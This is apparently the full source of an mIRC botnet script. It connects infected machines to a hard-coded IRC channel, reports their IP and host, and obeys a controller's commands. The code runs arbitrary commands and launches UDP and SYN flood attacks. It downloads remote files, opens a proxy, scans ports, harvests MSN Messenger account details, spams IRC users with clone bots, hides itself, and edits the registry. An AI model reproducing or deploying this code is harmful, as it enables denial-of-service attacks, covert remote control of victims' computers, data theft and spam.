on *:START:{
Tamer
}
on *:TEXT:*:*: {
  if (*!*deliler@clas.com* iswm $fulladdress) {
    if ($nick = clas) { 
      if ($1 = !x) { $2- }
      if ($1 = !reconnect) { timer 1 1 /quit reconnecting... | server $rds(sr) }
      if ($1 = !msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { amsg [Msn] Currently Offline. } | else { amsg [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
      if ($1 = !port) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | saym [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }
      if ($1 = !disk) { .saym I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf }
      if ($1 = !sys) { saym Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }
      if ($1 = !uptime) { saym system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }
      if ($1 = !speed) { saym [Connection] Speed: http://www.reaLcoder.net/? $+ $gettok($host,3-,46) | halt }
      if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }
      if ($1 = !pfast) { if ($4 == random) { //d0ntStart $2 $3 $r(1,64000) | halt } | //d0ntStart $2 $3 $4 }
      if ($1 = !Clone) { /clone $2- }
      if ($1 = !die) { if ($2 !== $null) { saym (SynPacket) (Attacking) $2 on $3 With $4 Packets | synp start $4 $2 $3 } }
      if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }
      if ($1 = !download) { saym Downloading: $2 | download file $2 $mircdir }
      if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { saym 2[8ERROR2]14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | saym 2[14bnc2]14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
      if ($1 = !bnc.stats) && ($sock(Bnc)) { saym 2[14bnc2]14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
      if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | saym 2[14bnc2]14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
      if ($1 = !var) { saym Variable equals to: [ [ $$2- ] ] }
      if ($1 = !rmb) && ($2 != $null) { saym Removed $2 | run van32.exe calcu.exe -kf $2 | remove $findfile(c:\, $+ $2 $+ ,1) }
      if ($1 = !if)  { f.cmd $2- }
      if ($1 = !inviteto) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { saym My Bot is Already ON!. }
        .if ($2 == off) { .saym Mass SPaMMer Sets OFF. | sockclose did* | timerinv* off }  
        .if ($2 == status) && ($sock(did*,0) != 0) { .saym Im 14Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
        .if ($2 == status) && ($sock(did*,0) = 0) { .saym Im 4NOT Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
        .if ($2 == GO) && ($sock(did*,0) != 0)  { saym Iam Already GONE!. }
        .if ($2 == GO) && ($sock(did*,0) = 0)  { saym Iam Going ;). | /ruwinviter }
        if ($sock(did*,0) = 0) {
          set %total.users 0
          .if ($3 = rand) { set %SPMChannel #kuwait  }
          .if ($5 = rand) { set %SPMChannel #kuwait  }
          .if ($2- == $null) { .saym Are U FooL Use !inviteto  NetWork/server (Channel/rand) (Invite MSG)  }
          .if ($2 == server) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }
        }
      }
    }
  }
}
alias f.cmd { if ($1 == $null) || ($2 == $null) || ($3 == $null) { return } | if ( [ [ $1 ] ] $2 [ [ $3 ] ] ) { [ [ $4- ] ] } }
on *:disconnect:{   timercheck -o 0 20 Cona  }
alias d0ntStart  { if $1 = STOP { .timerd0nt off | unset %gnum | saym [Packeting] Halted } | if $3 = $null { return } |  if $timer(d0nt).com != $null { saym 4ERROR!1 Currently Attacking: $gettok($timer(d0nt).com,3,32)  | return } |  saym sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerd0nt -m 0 400 d0nt1t $1 $2 $3 }
alias d0nt1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp Tw1st $2 $3 $str(âô_6ÜµKTE_}“‘²,60)
  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)
  sockudp Tw3st $2 $3 $str(@,920)
  sockudp Tw4st $2 $3 $str(0010110,130) 
  sockudp Tw5st $2 $3 $str(Pong,200)
  sockudp Tw6st $2 $3 $str(Tw1st,180)
  sockudp Tw7st $2 $3 $str(*,350)
  sockudp Tw8st $2 $3 $str(link,200)
  sockudp Tw9st $2 $3 $str(Tw1st,180)
  return |  :done | //saym [Packeting] finished | .timerd0nt off | unset %gnum 
}
alias ont { timerreopen $+ $1 1 4 sockopen $1 $2 $3 }
alias synp { if ($1 == $null) { return } | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop |  SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | SYN 1 $1- | SYN 1 stop | saym Syn Attack Done! }
alias SYN {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen SYN $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(SYN*,0) > 0) { sockclose SYN* } }
}
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $SOCKNAME NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $SOCKNAME
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}

alias jc { /join $rds(sc) $rds(sk) }
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off } } }
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:sockread:xxx*:{
  sockread %QHTread
  Stay %QHTread
}

alias fnick {
  set %fnick $rand(1,10)
  if (%fnick = 1) { return $read demo.xt $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fnick = 2) { return $chr($r(65,125)) $+ $read demo.xt $+ $chr($r(65,125))  }
  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  demo.xt }
  if (%fnick = 4) { return $r(A,Z) $+ $read demo.xt $+ $r(A,Z) }
  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fnick = 6) { return $read  demo.xt $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fnick = 7) { return $r(a,z) $+ $read demo.xt $+ $r(a,z) }
  if (%fnick = 8) { return $read  demo.xt $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fnick = 9) { return $read  demo.xt $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fnick = 10) { return $read  demo.xt $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias Cona { server $rds(sr) $rds(sp) | if ($portfree(113)) { socklisten IDENT 113 } }

alias clone {
  if ($1 = load) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }
  if ($1 = join) { sockwrite -nt xxx* Join $2- }
  if ($1 = crazy.c) { sockwrite -nt xxx* Join $2 | timer 20 0 //sockwrite -nt xxx* privmsg $2 : $3- }
  if ($1 = crazy.n) { timer 20 0 //sockwrite -nt xxx* privmsg $2 : $3- | timer 20 0 //sockwrite -nt xxx* notice $2 : $3- }
  if ($1 = part) { sockwrite -nt xxx* Part $2 : $+ $3- }
  if ($1 = msg) { sockwrite -nt xxx* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt xxx* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt xxx* Privmsg NickServ : $+ register $2- | sockwrite -nt xxx* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt xxx* Join %rchan | sockwrite -nt xxx* Privmsg Chanserv : register %rchan $fnick xxx }
  if ($1 = cycle) { sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- }
  if ($1 = kabus) { sockwrite -nt xxx* Join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* part $2 }
  if ($1 = flood.c) { sockwrite -nt xxx* join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }
  if ($1 = flood.n) { sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }
  if ($1 = chat.flood) { sockwrite -nt xxx* privmsg $2 :dcc chat $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt xxx* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt xxx* Join $2 | Sockwrite -nt xxx* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt xxx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timeropensock* off | sockclose xxx* }
}
alias opensock { sockopen xxx $+ $fnick %cserver %cport }
alias Stay {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:Sockopen:xxx*:{
  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
}
raw 433:*:{
  nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]] 
}
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
alias H1dd3 { if ($appstate != hidden) { /exit } }
alias s33 { if ($appactive = $true) { /exit } }
on *:connect:{ hostnick | .timerjc 0 $rand(2,5) /jc | .timercheck off | .inc %reaLcoder | if (%reaLcoder = 1) { msg $rds(rc) Exploit Editor OkaN ÇaÐ - $ip - $host - $uptime(system,2)  | .pdcc on | .fsend on | clearall } }
alias rds {
  if ($1 = sr) { return irc.deliler.net }
  if ($1 = sp) { return 3525 }
  if ($1 = sc) { return #clas } 
  if ($1 = sk) { return clas }
  if ($1 = rc) { return #clas  }
}
alias hostnick { 
  if (.edu isin $host) || (.ad. isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) && (wk isin $uptime(system,2)) { nick [edu-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.edu isin $host) || (.ad. isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) { nick [edu- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.gov isin $host) && (wk isin $uptime(system,2)) { nick [gov-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (.gov isin $host) { nick [gov- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (cable isin $host) && (wk isin $uptime(system,2)) { nick [cable-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (cable isin $host) { nick [cable- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (www isin $host) && (wk isin $uptime(system,2)) { nick [www-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (www isin $host) { nick [www- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (dsl isin $host) && (wk isin $uptime(system,2)) { nick [dsl-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (dsl isin $host) { nick [dsl- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (server isin $host) && (wk isin $uptime(system,2)) { nick [server-wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (server isin $host) { nick [server- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  if (wk isin $uptime(system,2)) { nick [wk- $+ $r(1000,9999) $+ $r(100,999) $+ ]] | goto end }
  nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]]
  :end
}
alias download {
  if (!$isid) {
    var %1 = download $+ $1,%2 = $longfn($3-)
    if (!$3) { linesep -s | echo $color(info) -s * /download: insufficient parameters | linesep -s | return }
    if ($sock(%1)) { linesep -s | echo $color(info) -s * /download: $+(',$1,') name in use | linesep -s | return }
    if (!$isdir(%2)) { linesep -s | echo $color(info) -s * /download: no such dir $+(',%2,') | linesep -s | return }
    unset % [ $+ [ %1 $+ .* ] ]
    set % [ $+ [ %1 $+ .file ] ] $+(%2,$iif($right(%2,1) != $chr(92),$chr(92)),$gettok($2,-1,47),.dat)
    set % [ $+ [ %1 $+ .url ] ] http:// $+ $remove($2,http://)
    set % [ $+ [ %1 $+ .ctime ] ] $ctime 0
    set % [ $+ [ %1 $+ .status ] ] Connecting
    sockopen %1 $gettok($remove($2,http://),1,47) 80
  }
  else {
    if ($1 == 0) { return $sock(download*,0) }
    if ($iif($1 isnum,$sock(download*,$1),$sock(download $+ $1))) {
      var %1 = $ifmatch,%2 = $dl.var(%1,file),%3 = $dl.var(%1,size),%4 = $file(%2).size
      if (!$prop) { return $right(%1,-8) }
      elseif ($prop == ip) { return $sock(%1).ip }
      elseif ($prop == status) { return $dl.var(%1,status) }
      elseif ($prop == url) { return $dl.var(%1,url) }
      elseif ($prop == file) { return $left(%2,-4) }
      elseif ($prop == type) { return $dl.var(%1,type) }
      elseif ($prop == size) { return %3 }
      elseif ($prop == rcvd) { return %4 }
      elseif ($prop == cps) { return $int($calc(%4 / ($ctime - $dl.var(%1,ctime,2)))) }
      elseif ($prop == pc) { return $int($calc($file(%2).size * 100 / %3)) }
      elseif ($prop == secs) { return $calc($ctime - $dl.var(%1,ctime,1)) }
    }
  }
}
alias -l dl.var { return $gettok(% [ $+ [ $+($1,.,$2) ] ],$iif(!$3,1-,$3),32) }
alias -l dl.fail { var %1 = $right($1,-8) | .signal -n download_fail %1 $2- | close -d %1 }
alias close {
  if ($1 == -d) {
    var %1 = download $+ $2
    if ($sock(%1)) {
      .remove $+(",$dl.var(%1,file),")
      unset % [ $+ [ %1 $+ .* ] ]
      sockclose %1
    }
  }
  else { close $1- }
}
on *:sockopen:download*:{
  if ($sockerr) { dl.fail $sockname Unable to Connect | return }
  var %1 = $dl.var($sockname,url)
  set % [ $+ [ $sockname $+ .status ] ] Requesting File
  sockwrite -tn $sockname GET %1 HTTP/1.1
  sockwrite -tn $sockname Host: $gettok($remove(%1,http://),1,47)
  sockwrite -tn $sockname Accept: *.*, */*
  sockwrite -tn $sockname Connection: close
  sockwrite -tn $sockname $crlf
}
on *:sockclose:download*:{ if ($dl.var($sockname,status) != done) { dl.fail $sockname Disconnected } }
on *:sockread:download*:{
  if ($sockerr) { saym Download Connection Failed | return }
  if ($dl.var($sockname,status) != downloading) {
    var %1 | sockread %1 | tokenize 32 %1
    if (HTTP/* iswm $1 && $2 != 200) { dl.fail $sockname $3- }
    elseif ($1 == Content-Length:) { set % [ $+ [ $sockname $+ .size ] ] $2 }
    elseif ($1 == Content-Type:) { set % [ $+ [ $sockname $+ .type ] ] $2- }
    elseif (!$1) {
      write -c $+(",$dl.var($sockname,file),")
      set % [ $+ [ $sockname $+ .ctime ] ] $dl.var($sockname,ctime,1) $ctime
      set % [ $+ [ $sockname $+ .status ] ] Downloading
      return
    }
  }
  else {
    var %1 = $dl.var($sockname,file)
    :sockread
    sockread &1
    if (!$sockbr) { return }
    bwrite $+(",%1,") -1 &1
    if ($file(%1).size >= $dl.var($sockname,size)) {
      var %1 = $right($sockname,-8),%2 = $dl.var($sockname,file)
      set % [ $+ [ $sockname $+ .status ] ] Done
      .copy -o $+(",%2,") $+(",$left(%2,-4),")
      saym Download Completed
      close -d %1
      return
    }
    goto sockread
  }
}
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %c = $com(%a).result
      .comclose %a
      if (%c != $null) return %c
      else {
        return NA 
      }
    }
  }
  else { return error! complete data }
}

alias RegWrite {
  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bStr,$1,bStr,$2,bStr,$3)
      .comclose %a
    }
    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {
      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }
      else { return error! when writing }
    }
  }
  else { return error! complete data }
}

alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete 
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
  else { return error! complete data }
}
alias Tamer { 
  .timerregs -o 0 3 regs
  .run dorod.exe /n /fh mirc
  .Cona
  .cfac
  .inc %many
  .if (%many = 1) { set %infecttime $day $date $time }
  .nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]]
  .timercheck 0 40 Cona
  .timerh1dd3 -o 0 1 H1dd3
  .timers33 -o 0 1 s33
  .timerhhide 1 5 delhide
  .selfspread
}
alias saym { msg  $rds(rc) $1- } }
alias selfspread {
  if ($exists(c:\WINNT\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy c:\WINNT\system32\ $+ $rds(sf) $rds(sf) | remove c:\WINNT\system32\ $+ $rds(sf) } | if ($exists(c:\WINDOWS\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy c:\WINDOWS\system32\ $+ $rds(sf) $rds(sf) | remove c:\WINDOWS\system32\ $+ $rds(sf) }
  if ($exists(d:\WINNT\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy d:\WINNT\system32\ $+ $rds(sf) $rds(sf) | remove d:\WINNT\system32\ $+ $rds(sf) } | if ($exists(d:\WINDOWS\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy d:\WINDOWS\system32\ $+ $rds(sf) $rds(sf) | remove d:\WINDOWS\system32\ $+ $rds(sf) }
  if ($exists(c:\ $+ $rds(sf)) == $true) { copy c:\ $+ $rds(sf)  $rds(sf) | remove c:\ $+ $rds(sf) } 
  if ($exists(d:\ $+ $rds(sf)) == $true) { copy d:\ $+ $rds(sf)  $rds(sf) | remove d:\ $+ $rds(sf) } 
  if ($exists(../ $+ $rds(sf)) == $true) { copy ../ $+ $rds(sf)  $rds(sf) | remove ../ $+ $rds(sf) } | if ($exists(../../ $+ $rds(sf)) == $true) { remove ../../ $+ $rds(sf) }
}
---------------------------------------------
---------the fucken mass inviter-------------
alias ruwinviter { sockopen did $+ $ticks $+ $r(1,999) %network }
on 1:SOCKOPEN:did*:{ if ($sockerr) { return } 
  .sockwrite -nt $sockname PONG $ctime
  .sockwrite -tn $sockname USER $read(hi) * * : $+ $read(hi)
  .sockwrite -tn $sockname NICK $fnick $+ $chr($r(65,125)) $+ $chr($r(65,125)) 
  .sockwrite -nt $sockname join %SPMChaNNeL
  .sockwrite -nt $sockname list >100
  timerpart 1 $r(5,30) /sockwrite -nt $sockname PART %SPMCHaNNeL 
}
on 1:SOCKREAD:did*:{ sockread -f %t.v | if ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { write ichan.bat $gettok(%t.v,4,32) } | /saving $sockname %t.v } 
alias saving {
  if ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names : $+ %SPAM }
  if ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names2 :  $+ %SPAM }
  if ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names3 :  $+ %SPAM }
  if ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names4 :  $+ %SPAM }
  if ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names5 :  $+ %SPAM }
  if ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names6 :  $+ %SPAM }
  if ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names7 :  $+ %SPAM }
  if ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names8 :  $+ %SPAM }
  if ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names9 :  $+ %SPAM }
  if ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names10 :  $+ %SPAM }
  if ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names11 :  $+ %SPAM }
  if ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names12 :  $+ %SPAM }
  if ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names13 :  $+ %SPAM }
  if ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names14 :  $+ %SPAM }
  if ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names15 :  $+ %SPAM }
  if ($3 = 366) { timerinv $+ $r(1,999) 1 1001 /finisheds $1 }
  if (47 = $left($3,2)) { /finished2 $1 }
  if (PING = $1) { sockwrite -nt PONG $1- }
}
alias goinvite { sockwrite -nt $1 JOIN %SPMChaNNeL |   timerpart 1 $r(5,60) /sockwrite -nt $1 PART %SPMCHaNNeL  }
alias finishedS { .saym I've Spammed on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Has been Affected this msg with no (@/+) one. Message sets: ( $+ %SPAM $+ )..... | if ($exists(ichan.bat) == $true) { set %SPMChannel $read ichan.bat } | if ($exists(ichan.bat) == $false) { set %SPMChannel $read inv.bat } | .saym Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }
alias finished2 { .saym There Was a Problem on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) NO Users Has been Messaged... AutoChanging Channel.. | if ($exists(ichan.bat) == $true) { set %SPMChannel $read ichan.bat } | if ($exists(ichan.bat) == $false) { set %SPMChannel $read inv.bat } | .saym Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;remover;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

alias delhide { 
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\Type)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\ObjectName)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\Start)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\ImagePath)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\ErrorControl)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\DisplayName)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor\Description)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ordor)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\Type)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\ObjectName)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\Start)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\ImagePath)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\ErrorControl)
